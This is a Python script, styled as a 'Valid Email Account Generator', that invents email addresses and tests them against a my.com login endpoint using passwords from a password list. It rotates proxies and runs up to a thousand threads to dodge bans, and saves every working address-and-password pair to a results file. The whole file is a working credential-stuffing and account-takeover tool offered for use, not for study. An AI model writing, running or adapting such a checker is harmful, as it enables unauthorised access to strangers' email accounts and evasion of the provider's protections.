import requests, os, threading, sys, time, random, ctypes, datetime, os.path, tkinter
from colorama import Fore, init
import datetime
from tkinter import filedialog
import random
import os
import json
import string
from requests.models import Response
import urllib3
e = datetime.datetime.now()
current_date = e.strftime("%Y-%m-%d-%H-%M-%S")
root = tkinter.Tk()
root.withdraw()

if not os.path.exists('results'):
    os.makedirs('results')
if not os.path.exists('results/{}'.format(current_date)):
    os.makedirs('results/{}'.format(current_date))

init()
blue, red, white, green, cyan, lightblue, reset = Fore.BLUE, Fore.RED, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.LIGHTBLUE_EX, Fore.RESET
proxylist = []
good, bad, cpm1, cpm2, generated, banned, errors = 0, 0, 0, 0, 0, 0, 0

def main():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Valid Email Account Generator")
    print("Made by KillinMachine#0001 ")
    print()
    print(   "Pick an option"   )
    print("\n  [1] Start\n  [2] Credits\n  [3] Quit")
    try:
        question = int(input(""))
    except Exception:
        print("{}Invalid input{}".format(red, red))
        time.sleep(2)
        main()
    if question == 1:
        start_mail()
    elif question == 2:
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Valid Email Account Generator")
        print('''Credits:
  - Project made by MachineKillin''')
        print()
        input("Press ENTER to get on menu..")
        main()
    elif question == 3:
        print("Closing.")
        time.sleep(2)
        sys.exit()
    else:
        print("Invalid input")
        time.sleep(2)
        main()

def screen():
    global generated, bad, good, cpm1, cpm2, banned, errors, num
    cpm2 = cpm1
    cpm1 = 0
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Valid Email Account Generator")
    print("{}██████████████████████████████████████████████{}".format(blue, blue))
    print("{}█{}{}═════════{}{}Generating Email Accounts{}{}══════════{}{}█{}".format(blue, blue, green, green, lightblue, lightblue, green, green, blue, blue))
    print("{}██████████████████████████████████████████████{}".format(blue, blue))
    print("{}█{}{}- Generated: [{}{}{}/{}{}{}]{}                            ".format(blue, blue, white, white, cyan, generated, num, cyan, white, white))
    print("{}█{}{}- Good: [{}{}{}{}{}]{}                                 ".format(blue, blue, white, white, cyan, good, cyan, white, white))
    print("{}█{}{}- Bad: [{}{}{}{}{}]{}                                  ".format(blue, blue, white, white, cyan, bad, cyan, white, white))
    print("{}█{}{}- Banned: [{}{}{}{}{}]{}                               ".format(blue, blue, white, white, cyan, banned, cyan, white, white))
    print("{}█{}{}- Gpm: [{}{}{}{}{}]{}                                  ".format(blue, blue, white, white, cyan, cpm2*60, cyan, white, white))
    print("{}█{}{}- Errors: [{}{}{}{}{}]{}                               ".format(blue, blue, white, white, cyan, errors, cyan, white, white))
    print("{}██████████████████████████████████████████████{}".format(blue, blue))
    time.sleep(1)
    threading.Thread(target=screen, args=()).start()   

def mail(email, password, proxylist):
    global generated, bad, good, cpm1, cpm2, banned, errors
    try:
        sess = requests.Session()
        proxy_to_use = random.choice(proxylist)
        try: 
            x = proxy_to_use.split(":")
            if len(x) == 2:
                proxies = {'http': f'http://{proxy_to_use}', 'https': f'https://{proxy_to_use}'}
                sess.proxies = proxies
            elif len(x) == 4:
                proxies = {'http': f'http://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}', 'https': f'https://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                sess.proxies = proxies
            else:
                pass
        except Exception:
            pass
        else:
            pass
        url1 = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={}&Password={}".format(email, password) 
        headers = {
            "User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"
        }
        f = sess.get(url1, headers=headers)
        if "Ok=1" in f.text:
            good+=1
            cpm1+=1
            generated+=1
            open('results/{}/good.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))         
        elif "Ok=0" in f.text:
            bad+=1
            cpm1+=1
            generated+=1
        else: 
            banned+=1
            cpm1+=1
            generated+=1
    except Exception:
        errors+=1 

def start_mail():
    global email, password, proxylist, num
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Valid Email Account Generator")
    print("   Coded by KillinMachine  ")
    input("Press ENTER to select proxies (HTTP or HTTPS)")
    fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a HTTP(S) Proxies File',
                                filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print()
        print("Please select valid proxy file")
        time.sleep(2)
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except:
                        pass
            print(" Loaded [{}] proxies lines.".format(len(proxylist)))
            time.sleep(2)
        except Exception:
            print("Your proxy file is probably harmed, please try again..")
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Valid Email Account Generator")
    print("How many threads do you want to use? [Max 1000]") #must be less than the account you want to generate.
    try:
        threads = int(input("  "))
    except Exception: 
        print("{}Invalid input.{}".format(red, red))
        time.sleep(2)
    if threads > 1000:
        print("Maximum thread value is {}1000{}".format(blue, blue))
        time.sleep(2)
        start_mail()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Valid Email Account Generator")
    print("How many accounts do you want to generate and check? [Min {}]".format(threads+1)) 
    try:
        num = int(input("  "))
    except Exception: 
        print("{}Invalid input.{}".format(red, red))
        time.sleep(2)
    if threads+1 > num:
        print("Minimum Value is {}.".format(threads+1))
        time.sleep(2)
        start_mail()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Valid Email Account Generator")
    print("Running Generator")
    time.sleep(1.5)
    screen()
    while 1:
        if threading.active_count() < int(threads):
            if generated < num:
                try:
                    namesfile = 'names.json'
                    names = json.loads(open(namesfile, encoding="utf8").read())
                    surnames = json.loads(open(namesfile, encoding="utf8").read())
                    passwordlist = json.loads(open('passlist.json', encoding="utf8").read())
                    name = random.choice(names).lower() + random.choice(surnames).lower()
                    domains = ['gmail.', 'gmail.', 'gmail.', 'gmail.', 'gmail.', 'gmail.', 'gmail.', 'yahoo.', 'yahoo.', 'yahoo.', 'hotmail.', 'hotmail.', 'hotmail.', 'aol.', 'aol.', 'aol.', 'outlook.', 'outlook.', 'outlook.', 'gmx.', 'gmx.', 'gmx.', 'Yandex.', 'icloud', 'tutanota', 'protonmail.', 'fastmail.', 'zoho.', 'mail.', 'hushmail.', 'aichi.', 'aim.', 'airforce.', 'airforceemail.', 'airmail.', 'airpost.', 'comcast', 'orange']
                    domains2 = ['com', 'com', 'com', 'com', 'com', 'com', 'com', 'org', 'org', 'org', 'org', 'org', 'net', 'net', 'net', 'int', 'int', 'edu', 'edu', 'edu', 'edu', 'gov', 'gov', 'gov', 'ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bl', 'bm', 'bn', 'bn', 'bm', 'bo', 'bq', 'br', 'bs', 'bt', 'bw', 'by', 'bz', 'ca', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr', 'cu', 'cv', 'cw', 'cx', 'cy', 'cz', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gd', 'ge', 'gf', 'gg', 'gh', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'is', 'it', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'li', 'ma', 'mc', 'md', 'mh', 'nl', 'no', 'np', 'nz', 'om', 'pa', 'pl', 'rs', 'ru', 'sa', 'sd', 'se', 'sg', 'si', 'sk', 'tc', 'td', 'tr', 'tw', 'ua', 'ug', 'uk', 'um', 'us', 'uz', 'uy', 'vn', 'vu', 'za', 'zm', 'zw', 'mail']
                    name_extra = ''.join(random.choice(string.digits) for _ in range(random.randint(1, 4)))
                    email_domain = random.choice(domains) + random.choice(domains2)
                    email = name + name_extra + '@' + email_domain
                    password = random.choice(passwordlist)
                    threading.Thread(target=mail, args=(email, password, proxylist)).start()
                except:
                    print("Accounts Generated")
                    time.sleep(5)
                    print()
                    input("Press any key to close the generator.")
                    sys.exit
            if generated > num:
                print("Generation Complete! Closing in 5 Seconds.")
                time.sleep(5)
                sys.exit
main() 
